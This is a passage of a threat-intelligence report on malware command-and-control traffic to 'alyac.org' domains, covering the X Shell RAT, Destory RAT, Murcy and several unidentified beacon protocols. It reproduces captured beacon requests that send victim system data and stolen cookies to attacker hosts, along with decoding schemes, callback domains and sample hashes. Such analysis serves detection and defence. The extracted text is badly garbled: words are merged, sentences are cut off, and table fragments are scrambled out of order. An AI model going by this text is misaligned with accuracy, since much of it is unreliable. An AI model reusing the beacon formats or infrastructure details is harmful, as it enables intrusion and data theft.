\u2018LURK0\\xB5\\x01\u2019. and (Sophos\tLtd.,2011) 10The legitimate domain \u2018windowsupdate.com\u2019 is used by Microsofttodeliverupdates\ttotheWindowsOS. 11Thedomain\u2018alyac.org\u2019was\tregisteredusing\tregistrationdetails thatmade\tthedomainappearas\tthough\titwas\tassociated\twith\tthe legitimate,trusted\tentityESTsoft\u2013theproducerofALYacantivirus software.(Command\tFivePtyLtd,\t2011)to \u2018Microsoft legitimatetheThe domain \u2018windowupdate.org\u2019 previously anIPaddresstowhich\t\u2018alyac.org\u2019also\tpreviously pointed.This\tshared\tinfrastructurefurthersuggests that\ttheobservedcommunicationsto\t\u2018path.alyac.org\u2019 and\tthoseto\t\u2018office.windowupdate.org\u2019may\tbelinked \u2018office.windowupdate.org\u2019 communications sent\tto was signed using\ta compromised code signing certificatebelongingto\tYNKJapanInc\t\u2013aproducerof onlinegames.\tThesamecertificatehasbeenused\tina numberofattacksincluding\tby\tHupigonmalware12 and malware similar to that used in the SK Communicationshack.\tDetailsof\tthecompromised code signing\tcertificate are shown in Figure 2. Nov27,2009\u2013Nov272011 Validity(GMT): DigitalID\tClass3\u2013SoftwareValidation DigitalID\tClass3\u2013Microsoft\tSoftware revoked\ton29\tJuly\t2011\tbut,\tasthemalwarewas signed\ton3\tJuly\t2010\tandtherevocationwasnot activeforsoftwaresignedbefore29July\t201113,\tthe certificate continued to\tvalidate for this malware aftertherevocation.\t(Fagerland,\t2011) Thedateof\teffectoftherevocationhassince beenbackdatedtoprevent\tthismalware\u2019scertificate fromvalidating14.\tThenewdateofeffectstillmay\tnot prevent\tthe validation of all malware using\tthis compromised\tcodesigning\tcertificate. 12Hupigonis\taremoteadministrationtoolfromChina.Ithas rootkit functionality, can log user activity and establishes outbound\tcommunications\ttoaC2\tserver.(F SecureCorporation) 13Therevocationisactivefromthe\u2018revocationDate\u2019(inthis\tcase, 29July2011)specified\tintheCertificateRevocationList. 14Therevocationforthecompromised\tcodesigningcertificatehas beenbackdated\tto 12\tApril\t2010\tso thattheearliest known malwaresigned\twith\titnolongervalidates.(Verisign,2011)COPYRIGHT\u00a9\tCOMMANDFIVEPTY\tLTD.ALLRIGHTSRESERVED.PAGE3OF\t29THE \u2018X SHELL\tC601\u2019 COMMUNICATIONSNumerous compromised\tcomputerscommunicated with \u2018path.alyac.org\u2019 on TCP port 443  a port commonly\tused\tfor SSL. These communications, however,\twere not\tSSL but\tinstead\tunencrypted communicationslikely\tgenerated\tby\taversionof\tthe AdministrationTool(RAT)15. communications,\tand\tthe information they reveal about\tthecompromised\tcomputer,\tis\tshowninTable 3.\tThe\u2018C\u2019immediately\tpreceding\tthe\u2018601\u2019inthe communications is believed\tto indicate that\tthe malwareis\tnot\tafreeversionbut\tinstead\tacustom,\tor commercial,\tversionof\ttheX Shell601\tRAT. \u20180x00\u2019\tbytes\tinallobserved\tsamples. 0 Tick\tcount(numberofmilliseconds 8 sincesystemwas\tstarted\t\u2013resets\tafter 49.7\tdays). 12 \u20180x00\u2019\tbytes\tinallobserved\tsamples. Null terminated\tusername(if Null terminated\tcomputername(if \u20180x00\u2019\tbytes\tinallobserved \u20180x00\u2019\tbytes\tinallobserved\tsamples. Tick\tcount(repeated). Unknown.Mainly\u20190x00\u2019bytes\tin observedcommunications. *ALL\tVALUES\tARELITTLE ENDIAN\tUNLESS\tOTHERWISE\tSTATED. TABLE3:X SHELLC601COMMUNICATIONFORMAT 15TheX ShellRATis\tcommercial\tsoftware.(XTiger,Xdoors.net, 2011) 16The SYSTEM_INFO structure contains information about a computersuch\tas\tits\tarchitecture,typeofprocessorand\tnumberof processors\tused.(MicrosoftCorporation,2011) 17A locale is a collection of language related user preference informationthattypicallyidentifies\tauser\u2019s\tcountryand\tdialect. (MicrosoftCorporation,2011)In\tall observed\tcommunications the process namelistedat\tbyte288was\u2018svchost.exe\u201918.\tBased\ton this,\tthe malware has likely\tmodified the system registry\tonthecompromised\tcomputersinsuch\ta way\tthat\ttheRAT\tgetsexecutedasaserviceby\tthe trusted\tprocess\u2018svchost.exe\u2019each\ttimethecomputer is\tstarted.\tThis\tprocessname,\talong\twiththecallback location,\tis\tconfigurable,\tand\tcanbeconfigured\tafter theRAThasbeencompiled\tinto\texecutableform. WhileX Shellsupportsnumerousversionsofthe WindowsOS(includingWindowsXP,\tVista,\tWindows 7,\tand\tWindows\t2000,2003\tand\t2008\tserver both 32\tand\t64\tbit\tversions),\tonly\tcomputersrunning Windows XP were observed\tcommunicating\twith \u2018path.alyac.org\u2019. The functionality of the RAT\tdepends\ton the version,\treleasenumber,\tpluginsinstalled\tand\ttheOS onwhich\ttheRAT\tisinstalled19.\tSeveralversionsof theX ShellRAT\texist,\tincludingafreeversionand\ta \u2018spy\u2019version20.\tThefreeversionoftheRAT\tis\tno longer available for download\tfrom\tthe XDoors website,\thowever,\tdevelopment of\tthe software continues21.\tCurrent\treleasenumbersof\ttheX Shell RAT\tinclude601\tand\t603.Previousreleasesdate backto\tat\tleast\t200622. versionsof\ttheRATincluding\ttheabilityto\tstart\ta command shell, control processes and services, upload/download\tfiles,\tterminateTCP\tconnections, createuseraccounts,\tretrievesystem\tinformation,\tlog useractivity(viaakeylogger),\tmodifytimestamps\ton files,\tconduct process injection, conduct denial of service attacks and shutdown or computer. Commands supported by the X Shell softwarearelisted\tinAnnexC.\t(XTiger) 18Theprocess\t\u2018svchost.exe\u2019\tisagenerichostprocessforservices which\trunfromDLLs.(Microsoft,AdescriptionofSvchost.exein WindowsXP\tProfessionalEdition2007) 19Notallfeatures\taresupported\tineach\tOS.Forexample,raw 20Versions\tofX Shellincludea\u2018personal\u2019edition,a\u2018mini\u2019version, an\u2018advanced\u2019\tversion,a\u2018spy\u2019versionand\tan\u2018enterprise\u2019version. (XTiger Crackersoftware,2011) 21Duetotheauthorwantingtoavoid\t\u201cunnecessarytrouble\u201d,asof 16March2011,thefreeversionoftheX ShellRAT(and\talsoits sisterproducttheX DoorRAT)is\tnolongeravailable\tfordownload from the \u2018xdoors.net\u2019 webpage, however, an online forum containing\talistofchanges\tmadetotheRATcontinues\ttobe updated. (XTiger, forum.xdoors.net. Topic: X Door/X Shell free download\tpaused,2011) 22Previousreleases\tofX Shellinclude\treleasenumbers323,325, 327,\t329,331,333,335\tand\t337.(XTiger,2010) COPYRIGHT\u00a9\tCOMMANDFIVEPTY\tLTD.ALLRIGHTSRESERVED.SIZE 300functionality comesstandardPAGE4OF\t29itsspecifyconnectionTheRATis\tVirtualMachine(VM)aware,\tproxy awareand\tcanalso\tuseaspecified\tDNS\tserverto resolvecallbackdomains.\tSomeversionshaverootkit functionality\tand\tcanavoid\tdetectionbyantivirus software.\tThird party\tpluginscanbedeveloped\tand anSMS\tnotificationservice,\tand\tfunctionality\tthat enablesthecompromisedcomputertobeusedas part\tof\ta botnet\tto\tsend\tspam\tor to\tconduct distributeddenialof\tserviceattacks.\tThis\tbroadrange of\tfunctionality\tmakesthesoftwarefitforanumber of\tpurposesand\treflectsthecommercialnatureofthe software.\t(XTiger) The X Shell RAT is generated by the X Shell ControlProgram\t thesameprogramfromwhich\tthe malwareis\tcontrolled.Thecontrolprogram\tcanbe run in either Chinese language mode or English languagemode,\tandallowsthemalwaretobeeasily configured.\tIt\tprovidesoptionstodigitally\tsignthe (connect/listen/sniff),\tinstallthemalwareinoneof severalcovertmanners,\trecovertheSystem\tService Dispatch\tTable(SSDT)23beforeinstallation,\tand\tabort installationifavirtualmachineis\tdetected.(XTiger) When X Shell malware is generated,\tand\tthe \u2018connect\u2019connectionmode24selected,\tthemalwareis configured with\ta static C2\thost\t(IP\taddress or callbackdomain)and\tcontrolport.\tAdditionally,\tan optioncanbeselectedduring\tthegenerationprocess to\tactively\tnotifythemalwareof\tanew\tC2host\tand portviaaconfigurationwebpage25.\tIf\tthisoptionis selected,\tthe malware communicates with both\ta configurationwebpage,and\taC2serverat\tregular intervals.\tTheintervalforeach\tcanbeseparately configured to a value of between 30 and 3600 seconds\t(inclusive).\t(XTiger) TheX ShellRATs\tthat\tcommunicated\twith\ttheC2 host\t\u2018path.alyac.org\u2019hadbeenconfiguredtousea36 second\tinterval.\tIt\tis\tnot\tknownwhetherthemalware was configured\tsolely\twith\ta static C2\thost\tor 23The SSDT is\toften used\tby kernel\tmode\trootkits\tto evade detection. 24Inthe\u2018connect\u2019\tmode\tthemalwareattempts\ttocommunicate withits\tC2\tserver,asopposedtothe\u2018listen\u2019\tmodeinwhichitwaits foraC2\tservertoattempttoconnecttoit. 25Theconfigurationwebpageis\toftennamed\t\u2018xcip.asp\u2019\tand\tcanbe generated\tand\tuploaded\tfromwithinthecontrol\tprogram.\u2018Xcip\u2019\tis presumably\tan acronym for \u2018X door Configure IP\taddress\u2019\tor something\tsimilar.X Shell Configuration Webpageswhetherthemalwarealso\tretrievesits\tC2hostand portfrom\taconfigurationwebpage. X Shellconfigurationwebpagescontain,inencoded form, a colon separated\tIP\taddress (or callback domain) and port for the malware to use to communicate with\tits C2\tserver. The encoded IP address(orcallbackdomain)and\tcontrolport\tcanbe decoded\tonebyteat\tatimeusing\ttheformula: di=\tei\u2013((i%8)+x), wherei\tis\tthebyteindex,\tdi\tis\tthedecoded\tbyte,\teiis theencoded\tbyteand\tx\tisaonebytekey.Thisis\tthe equivalent\tof\tsubtracting\tboth\tthekey\tand\tthebyte positionnumber[0 7]\tfromeach\tbyte.\tTheposition numberis\tmodulo\t8i.e.\trepeatsevery\t8bytes. For example,\tif\tthe compromised\tcomputers received\ta C2\thost\tof \u2018PATH.ALYAC.ORG\u2019 and\ta controlport\tof\t443\tfrom\taconfigurationwebpage, and\takey\tof\t0x16\t(22\tindecimal)wasused\tto\tencode HyperText\tTransferProtocol(HTTP)\tPOST\t\u2018Update?\u2019 \u2018path.alyac.org\u2019 and requests were sent\tto both \u2018update.alyac.org\u2019 from compromised computers. Two request\tformats were observed; Variant\tA (showninFigure3)inwhich\tthefilepath\trequested was \u2018/update?product=windows\u2019, and Variant B (showninFigure4)inwhich\tthefilepath\trequested was\u2018/update?id=number\u2019,\twhere number\trefersto\tan eight digit hexadecimal number that changes betweenrequests.\tThedomain\u2018path.alyac.org\u2019only received\tVariant\tBrequests,\twhilebothvariantswere sentto\t\u2018update.alyac.org\u2019.THE \u2018UPDATE?\u2019 COMMUNICATIONSCOPYRIGHT\u00a9\tCOMMANDFIVEPTY\tLTD.ALLRIGHTSRESERVED.PAGE5OF\t29POST /update?product=windows HTTP/1.1 Accept: */* X-Session: 0 X-Status: 0 X-Size: 61456 X-Sn: 1 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1; Host: update.alyac.org Content-Length: 0 Connection: Keep-Alive Cache-Control: no-cache Cookie: VisitorID=c2a4b456-e11e-4c37-88d8- e770aa88058d&Exp=9/25/2014 6:14:17 AMFIGURE3:VARIANTACOMMUNICATIONS\ufffd Backdoor:Win32/Thoper.A29, Trojan.Downloader:Win32/ThoperB30. Theobserved\tcommunicationstothe\u2018alyac.org\u2019 subdomainsalloccurredonTCPport80,however,a variety\tof\tports(TCP\tports8080,\t443,\t12345\tetc.) havebeenused\tbythisparticularfamily\tofmalware forsimilarrequests.\tTheport\tuseddependsonhow thecomputerswerepowered\ton.\tForexample,\tone computer connected at 16\tsecond intervals and another approximately\tevery 200 seconds\t(\u00b115 seconds).\tThreeHTTP\tPOST\trequestsweresubmitted during\teach\tconnection, each\tapproximately\tone secondapart. Thefollowingmalformeduser agent31is\tpresent intheHTTP\tPOST\trequestsof\tboth\tvariants(spaces shownhereas\u2018\u00b7\u2019): \u2018Mozilla/4.0\u00b7(compatible;\u00b7MSIE\u00b76.0;\u00b7Windows\u00b7NT \u00b75.1;SV1;\u2019 This\tuser agent\tis\tconsistent with that\twhich may\tbegeneratedby\tversion6.0oftheMicrosoft Internet Explorer web browser running on the Microsoft\tWindows\tXP\tOS,\texcept\tthat\tit\tis\tmissing\ta closing\tbracket\tafterthelast\tsemicolonandaspace afterthesecondtolast\tsemicolon.Thismalformed user agent\tis\thardcoded\tinto\tthemalwareand\tcanbe used\tasasignaturetodetect\tthecommunications. Four custom headers are also\tpresent in the HTTPrequests:\t\u2018X Session\u2019,\t\u2018X Status\u2019,\t\u2018X Size\u2019,\tand\u2018X  Sn\u2019.ForsomemalwareintheDestory\tRATfamily\tnot 29TheDestoryRATwith\tMD5\thash\u20185FCE1FC1\t8283D76C\t396A 3CCC 64BD BBDE\u2019\tis detected by antivirus software as both Backdoor.Soguand\tBackdoor:Win32/Thoper.A.This\tmalicious\tfile is\tidentical\ttothatused\tintheSK\tCommunications\thack\texceptfor itsconfiguration.(HispasecSistemas,2011) 30TheDestoryRATwith\tMD5\thash\u2018754364D9\tDB702DC71532 7B40 BF97 E556\u2019\tis detected\tby antivirus\tsoftware as both TrojanDownloader:Win32/Thoper.B. (HispasecSistemas,2011) 31User agents are used in HTTP communications to tell webserverswhich\tOSand\twebbrowsertheirclients\tareusing,so theycanservecompatiblewebpages. COPYRIGHT\u00a9\tCOMMANDFIVEPTY\tLTD.ALLRIGHTSRESERVED.PAGE6OF\t29POST /update?id=3109c2a2 HTTP/1.1 Accept: */* X-Session: 0 X-Status: 0 X-Size: 61456 X-Sn: 1 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1; Host: path.alyac.org Content-Length: 0 Connection: Keep-Alive Cache-Control: no-cache Cookie: VisitorID=bd5ab197-355d-42cb-ae1b- 8d23f1dd55ed&Exp=9/25/2014 6:03:33 AMFIGURE4:VARIANTBCOMMUNICATIONS The format\tof\tVariant A is\tidentical to the communicationsgenerated\tby\ttheDestoryRAT\tused in the SK Communications hack26.\tThe format\tof Variant B is generated\tby\tmalwarethat\tusesthecallbackdomain \u2018gm1.network sec.net\u201927. asJanuary\t200728and\thasbeenusedinseveralmajor 26Foradetailed\tanalysis\toftheDestoryRATused\tintheSK Communicationshack\t(including\tacompletelistofdeobfuscated strings)refertotheCommandFivepaper\u2018SKHack\tbyanAdvanced PersistentThreat\u2019.(Command\tFivePtyLtd,2011) 27Malware detected as \u2018Troj_Inject.AMR\u2019 submits HTTP\tPOST requests\tto\u2018gm1.network sec.net/update?id={value}\u2019.Thedomain \u2018gm1.network sec.net\u2019is\taknowncallbackofmalwaredetectedas Backdoor:Win32/Thoper.A.(Mendoza,2011)(Wong,2011) 28TheDestoryRATwith\tMD5\thash\u201870CDC9A2\tD9CC276B\tC5D1 D47D21FB\t24DF\u2018\twascompiled\ton3\tJanuary2007.Cookie\tStealingCookiesweresentwiththeHTTPPOSTrequestsfrom allbut\tthreeIPaddresses.Acookienamed\u2018VistorID\u2019 waspresent\tany\ttimeacookiewassent.\tOnoccasion a\u2018Yahoo\u2019,\t\u2018SessionId\u2019and/or\u2018fcVal\u2019cookiewasalso present\tintherequests.Thetransmissionofthese cookiescould\tfacilitatesessionstealingand,inthe case of the Yahoo cookie, enable unauthorised webmailaccess. Each\tVisitorID\tcookiecontainedanexpiry\ttime between 9/25/2014 5:50:03\tAM and\t9/25/2014 6:14:17\tAM.\tTheexpiry\ttimeis\tuniqueforeach\tvictim and\tremainedconstant(pervictim)\tacrosstheHTTP POST\trequests.\tItis\tpossiblethevictims\treceived\tthe cookie from\ta C2 server with which\tthey\thad previously\tcommunicated,\tor,\tfrom\taserverhosting\ta webpagethatcaused\ttheinitialinfection.Itis\talso possiblethat\tthecookie,and\tthepropinquity\tof\tthe timesinthecookies,\tiscoincidental,\tandthat\tthe victims\treceivedthecookiefrom\totherlocations. Multiple Chinese IP addresses were observed submitting HTTP GET to the host requests \u2018path.alyac.org\u2019. Data communicationsindicated\tthat\ttherequestswereall sent\tfrom\ta single computer,\tand\ttherefore that computerwasnot\tusing\tastaticIP\taddress. Thedatafrom\tthecomputerwascarriedinthe requestsinanencoded\tform\t(asdescribed\tbelow) withinaHTTPheadernamed\t\u2018Extra Data\u2019.\tTwo\tother uniqueheaderswerealso\tpresent\tintherequests; The \u2018Extra Data Space\u2019. and \u2018Extra Data Bind\u2019 communicationsappearto\tbegeneratedbymalware knownas\u2018Backdoor.Murcy\u2019that\tis\treportedly\tnot\tin widespread\tuse32.\tAnexampleof\tanactualHTTP\tGET requestis\tshowninFigure5.THE \u2018MURCY\u2019 COMMUNICATIONSGET /150828 HTTP/1.0 Connection: Keep-Alive Accept: */* Host: path.alyac.org User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Extra-Data-Bind: DE6A34D80D43B930 Extra-Data-Space: 65536 Cache-Control: no-cache Pragma: no-cache Content-Length: 0FIGURE5:SAMPLEOFMURCYCOMMUNICATIONS The path\tin the HTTP GET\trequests is\tthe computer\u2019stickcount(i.e.thenumberofmilliseconds sincethesystemwasstarted).\tTherequestsfrom\tthe victim\toccurred\tapproximately\tevery\t11 seconds whenthecomputerwasturned\ton.\tAccordingly,\tthe numberintheURI\tincreasedbyapproximately\t11000 each\trequest. Where there was a break in the communications(presumably\tdueto\tthecomputer being\tshut\tdownorrebooted),\tthecounterreset\tand was between 128703\tand\t133243\tin the next communication. This indicates that computer within minutes of\tthe computer being booted.Theencoded\tdatawithinthe\u2018Extra Data\u2019header canbedecoded\tusing\tthestandard\tBase64alphabet but\twith\tmodified\tbit\tplacement.\tThe standard Base64\talgorithm\tdecodes encoded\tstrings using consecutivebitsread\tleft\ttoright\ti.e.\tbits0 7\twould formthefirst\tdecodedbyte(showninFigure6).For Murcycommunications,\ttheinputbits\tthat\tformeach output\tbyte are not\ttaken contiguously.\tFigure 7 describes how\tthe first\tthree decoded\tbytes are constructed, and can be used to implement a decoding\talgorithm.from32SymantecCorporationassessesthenumberofBackdoor.Murcy infections\ttobelessthan50.(Ward,2011)COPYRIGHT\u00a9\tCOMMANDFIVEPTY\tLTD.ALLRIGHTSRESERVED.PAGE7OF\t29895 some input data sizes a crude, but For functionally\tequivalent,approach\tistoreversethe inputbytes,\tapply\tastandard\tBase64decoding,\tand thenreversetheoutput\tbytes. Thedecoded\tstring\tcontainscommunicationsof\ta format\thereonreferred\ttoasthe\u2018IP2B\u2019\tprotocol.\tAll observed\tIP2Bcommunicationsbeganwith\ta16\tbyte 0x12345678\tand\t0x10001000,\tand\tthesizeof\tthe data.\tThedecoded\tversionof\ttheMurcy\t\u2018Extra Data\u2019 stringfrom\tFigure5is\tshowninFigure8.The decoded data reveals the name of\tthe compromised\tcomputer,that\tthecomputeris\trunning WindowsXP\tServicePack3,its\tinternalIP\taddressis its screen resolution is set to 1920x1080and\tthat\tits\tlocale33is\t\u2018Chinese China\u2019.\tA Protocolidentifier.\u20180x12345678\u2019in IP\taddress.Valueisbig endian. IP\taddress.Valueisbig endian. Vertical\tscreenresolution(pixels). Tick\tcount.Valueis\tidentical\ttothat Ident Anullterminated\t2 bytewide characteridentifierstring. SPack\t Anull terminated\t2 byte widecharacterstring\tindicating\tthe UName Anullterminated\t2 byte CName\u2013Anull terminated\t2 byte *ALL\tVALUES\tARE\tLITTLE ENDIAN\tUNLESS\tOTHERWISE\tSTATED. 33A locale is a collection of language related user preference informationthattypicallyidentifies\tauser\u2019s\tcountryand\tdialect. (MicrosoftCorporation,2011) 34For a list oflocaleidentifiers\trefertotheMicrosoftMSDN referencepage.(MicrosoftCorporation,2011) COPYRIGHT\u00a9\tCOMMANDFIVEPTY\tLTD.ALLRIGHTSRESERVED.containing78 56 34 12 00 10 00 10 DA 00 DA 00 ; xV4 00 00 00 00 18 09 07 20 C0 A8 84 82 ; C0 A8 84 82 F0 FD 07 00 54 0D 00 00 ; T 80 07 00 00 38 04 00 00 04 08 00 00 ; 8 2C 4D 02 00 05 00 00 00 01 00 00 00 ; ,M 28 0A 00 00 02 00 00 00 4C 00 00 00 ; ( L 8A 00 00 00 A8 00 00 00 AA 00 00 00 ; B8 00 00 00 D8 00 00 00 38 00 33 00 ; 8.3. 37 00 42 00 xx xx xx xx xx xx xx xx ; 7.B.xxxxxxxx xx xx xx xx xx xx xx xx xx xx xx xx ; xxxxxxxxxxxx xx xx xx xx xx xx xx xx xx xx xx xx ; xxxxxxxxxxxx xx xx xx xx xx xx xx xx xx xx xx xx ; xxxxxxxxxxxx xx xx 36 00 39 00 31 00 00 00 53 00 ; xx6.9.1 S. 65 00 72 00 76 00 69 00 63 00 65 00 ; e.r.v.i.c.e. 20 00 50 00 61 00 63 00 6B 00 20 00 ; .P.a.c.k. . 33 00 00 00 00 00 53 00 59 00 53 00 ; 3 S.Y.S. 54 00 45 00 4D 00 00 00 57 00 4F 00 ; T.E.M W.O. 57 00 2D 00 45 00 38 00 45 00 xx xx ; W.-.E.8.E.xx xx xx xx xx xx xx xx xx xx xx xx xx ; xxxxxxxxxxxx 36 00 00 00 00 00 ; 6 FIGURE 8: EXAMPLE OF DECODED MURCY DATA STRINGPAGE8OF\t29IP2B ProtocoltheTHE \u2018OSCAR\u2019 PROTOCOLdata wasTHE \u2018BB\u2019 PROTOCOLThedatasent\tto\ttheC2\tserveris\tdependent\ton theC2instructionsreceived.\tCommands\ttheMurcy malwarereportedly\tunderstands\tareshowninAnnex D.\t(SafeZoneCast,\t2011) The Murcy malware is commonly named \u2018cydll.dll\u2019,\tcreates a mutual exclusion (mutex35) handlenamed\t\u2018Cy1.0Mutex\u2019,\tand\tinstallsaservice named\u2018CyService\u2019with\tadisplay\tnameof\t\u2018CyService Service\u2019.\tIt\talso\tcommonly\tgains persistence by %System%\\cydll.com\u2019inthe\u2018ControlSet001\u2019keyin Backdoor.Murcy on 31\tJuly\t2011,\tyet\tthe same malware appears to\thave been first\tdetected\tby Kaspersky\tLab on 11 January\t201036.\tMalware sampleswith\tthesameattributesdatebackto\tat\tleast October 200937. This suggests that the Murcy malwarehasbeeninuseforat\tleast\ttwo\tyears. Known Murcy malware uses \u2018albertstein.ddns.us\u2019 \u2018alvington.jetos.com\u201939,\t\u2018ftp.xmahone.ocry.com\u201940,\tand 38 \u2018superaround.ns02.biz\u201941.\tThese callback domains wereallalso\treportedly\tused\tintheMarch\t2011 intrusionintoRSA\u2019snetwork.\tThatintrusionresulted inthetheft\tof\tinformationrelated\tto\tRSA\u2019sSecurID authentication products. The informationwaslaterused\tto\tenabletargeting\tof defence contractors. (Coviello,\t2011).\t(Rasmussen, 2011)(US CERT,\t2011). 35Amutexisatechnical\tconstructused\ttocontrolaccesstosystem resources.Inthis\tcasethetechnicalmeaning\tis\tlesssignificantthan thefactthatthemutexintheMurcymalwareis\tuniquelynamed. 36Malwarethatfits\ttheprofileofMurcymalwarewas\tdetected\ton 11January2010as\t\u2018Backdoor.Win32.Agent.anvj\u2019.(KasperskyLab ZAO,2010) 37Malwaredetected\tin2009withtheMD5\thashes\u20183FDEA18B 9610CBC9B63B\tA7A44899FBFB\u2019and\t\u201842E8163B7F08DD38 3E62 E4BD B7F0 7C08\u2019\tis known to callback\tto IP address 38MalwarewiththeMD5\thashes\u201819B0\t227B\tEC75BEF9\t3C6C CC549B6D2BA0\u2019\tand\t\u20183DF0D0AB\t4AD9\tDA4559A1\tC646\t4C85 26D1\u2019\tcallback\ttothedomain\u2018albertstein.ddns.us\u2019.(GFISoftware, 2010)(Sandbox,2010) 39Malwarewith\ttheMD5hashes\t\u201891A2\t68B317D2\tCC65\t69B8 5BB0\t3A5F\tF841\u2019\tand\t\u201869ED8F7B\t0046956045A9\t0E36\tE3C8 3F6A\u2019\tcallback\tto the domain \u2018www.alvington.JetOS.com\u2019. (GFI SandBox,2011)(SunbeltSecurity,2010) and\t\u20189ADDC6D5\t7330\t9399\tE2B8\t7887\t3A00A921\u2019\tcallbacktothe domain\u2018ftp.xmahone.ocry.com\u2019.(GFISandbox,2011)(Telus,2011) (ThreatExpertLtd,2011)(GFISandbox,2011) 41Malwarewith\tMD5\thash\u20183740\t5D5B\tCF64FB95\t47CACDA9 5F4CE8B4\u2019is\tknowntocallbackto\u2018www.superaround.ns02.biz\u2019. (GFISandbox,2010)Numerouscomputerswereobserved\tcommunicating with\tan\u2018alyac.org\u2019subdomainonTCP\tport\t80\tviathe \u2018Oscar\u2019protocol.Most,but\tnotall,\tofthecomputers also\tcommunicated to the same domain via the \u2018Update?\u2019communications.\tTheprotocolis\tbelieved to be associated with the same malware that producesthe\u2018Update?\u2019communications\u2013theDestory RAT.Each\tcompromisedcomputercommunicated\tat\ta different\tintervalto\ttheothers,\tand\taccordingly,\tthe malware on each\tof\tthe compromised\tcomputers appearstohavebeenindividually\tconfigured.\tFor example,\tone computer communicated every 12 seconds\tand\tanotherevery\t16\tseconds. communication.Thelengthof\ttheencrypteddatain each\tpacket\tvaried\tbetween16\tbytesand89\tbytes. Aftersending\ttheencrypted\tdatathemalwarewaited \u2018update.alyac.org\u2019viathe\u2018BB\u2019protocol.\tOneof\tthe computersused\taChineseIP\taddress,\ttheothera South\tKoreanIP\taddress.\tThe\u2018BB\u2019protocolhasa21 byteheadercontaining\ta4byteXORkeythat\tcanbe usedtodecodetheremaining\tbytesinthepacket.The packet\tformat\tisdescribed\tinTable5. SizeBB Sizeinbytes\t(including indicator.\u20180x010x000x000x00\u2019inall Unknown.\u20180x010x040x010x00\u2019inall Unknown.\u20190x00\u2019inallobserved Dataencoded\tusing\tthe4\tbyteXORkey [SizeBB] specified\tinbytes\t12 15. *ALL\tVALUES\tARE\tLITTLE ENDIAN\tUNLESS\tOTHERWISE\tSTATED. TABLE5:'BB'PROTOCOLPACKETFORMAT COPYRIGHT\u00a9\tCOMMANDFIVEPTY\tLTD.ALLRIGHTSRESERVED.PAGE9OF\t29THE \u2018DB\u2019 PROTOCOLaboutAftersending\tthebasicbeacon,\tthecompromised computerswaitedforaresponsefromtheserver, then closed the connection when they had\tnot received\ta response from the server within five seconds.Both\tofthecompromised\tcomputersreattempted the communications approximately every eight seconds.Onsomedaysthehighfrequency\tof\tthe Asinglecomputerwasobserved\tcommunicating\twith thedomain\u2018update.alyac.org\u2019viathe\u2018DB\u2019protocol. The communications originated from the same Chinesecomputernetworkasoneof\tthe\u2018BB\u2019victims but\tfromadifferent\tcomputeronthat\tnetwork.\tIt\tis not known what malware generates that\tgeneratesthe\u2018BB\u2019communications. The communications reveal detailed\tOS and revealsthat\tthecompromised\tcomputeris\trunning Windows2003ServerServicePack2.Thedetailed system\tinformation revealsthat\tthecompromised computerhasanIntelPentium\tPro classprocessor, four logical processors and\tan LGA 77542Central Processing\tUnit\t(CPU)socket. TABLE6:SUMMARYOFFIRST202BYTESOFA\u2018DB\u2019 PACKETThe DB communications typically\toccurred\tat intervalsof\tbetween4\tand\t92\tseconds,however, sometimes they were much\tfurther apart. After sending\tthedetailedbeaconto\tthecommand\tand controlserver,\tthecompromisedcomputerappeared to\texpect\taresponsefromtheserver. informationindicatesthecomputerhas\tanLGA775\tCPUsocket (Intel\tfamily6/model\t15/stepping\t11).(MicrosoftCorporation, 2011)(Wikipedia) 43Onseveraloccasionsthe4bytes\t\u201870170000\u2019\twereprepended tothecommunications.combined processorSIZE 10and processortheseTHE \u2018QDIGIT\u2019 PROTOCOLFREQUENCY OF\tCOMMUNICATIONSis assumedOnecomputerusingastaticSouthKoreanIPaddress wasobserved\tsending\tthefivebytes0x510x31\t0x39 0x21\t0x00\t(\u201c\\x51Q19!\u201d)\tto\t\u2018update.alyac.org\u2019onTCP port\t80\tup\tto\tnearly\t800timesaday.\tWhilethe communicationsdid\tnot\toccur\tcontinuously\t(likely dueto\tthecomputerbeingturned\toff),\twhentheydid occur\ta new\tconnection was attempted, and\tthe packet\tcontaining\t\u2018Q19!\u2019sent,\tapproximately\tevery generated by\tmalware but it\tis\tnot\tknown what malware,\tor which\tother callback domains that malwareuses.Themalwareappeared\ttoexpect\ta responsefrom\ttheserverafterit\tsenteach\tpacket. to \u2018alyac.org\u2019 computer.Asummary\toftypicalobserved\tintervals betweencommunications,\tbrokendownby\tprotocol, is\tshowninTable7. TYPICAL\tBEACON\tINTERVAL* 1\tto13,12\u00b13,16,104\u00b13or200\t\u00b115 12\u00b12,13,15,16,(55or155\u00b15),(7.5,\t8.5or15), Oscar (45,55,\t106) *Commas\tindicatethattheinterval\tchanged\tbetweenvictims. Brackets\tindicatethatavarietyofintervalswereobserved\tfrom ThesingleLURK\tvictim\twastypically\tobserved beaconingat\t26second\tintervals,\ttheMurcy\tvictimat 11\tsecond intervals,\tand the Qdigit victim at 60 second\tintervals.\tAllof\ttheX ShellC601\tvictims\twere typically\tobservedbeaconing\tat\t36second\tintervals, and\tthe BB victims\tat\t8 second\tintervals.\tThe beaconing interval of the other victims\tdoes not appearto\tbeafixed\ttime,\tand\tinstead\tadegreeof randomnessappearstobeemployed.COPYRIGHT\u00a9\tCOMMANDFIVEPTY\tLTD.ALLRIGHTSRESERVED.PAGE10OF\t29Ports usedASSOCIATION WITH\tMALWARE AND ATTACKSPORT alloccurred\tonTCP\tport\t80orTCP\tport443\t ports commonly\tused\tforlegitimatepurposes44. While most\tmalware uses the local DNS\tserver settingsofthecompromised\tcomputertoresolveits callbackdomainto\tanIP\taddress,\tinsomeobserved the attackers appear specifically\tchosentheDNS\tservers. ThemajorityofX ShellC601\tmalwarethatcalled back to\t\u2018path.alyac.org\u2019 used\tGoogle DNS servers, presumably\tinstead\tof the DNS settings on the compromised\tcomputers.\tTheX ShellC601\tmalware supportsuseof\taspecified\tDNS\tserverto\tresolve callbackdomains,\tand\tit\tappearstheattackershave madeuseof\tthisfunctionality. The\u2018Update?\u2019,\tOscar,\tMurcyand\tQdigit\tvictims\tall appearto\thaveused\ttheirlocalDNS\tserversettingsto resolvethecallbackdomains.\tOntheotherhand,\tthe single LURK victim\tused\tGoogle DNS\tservers to resolveits\tcallbackdomain,\tasdidtheChineseBB victim\t(and\tassociated\tDBvictim)\tbut\tnot\ttheSouth 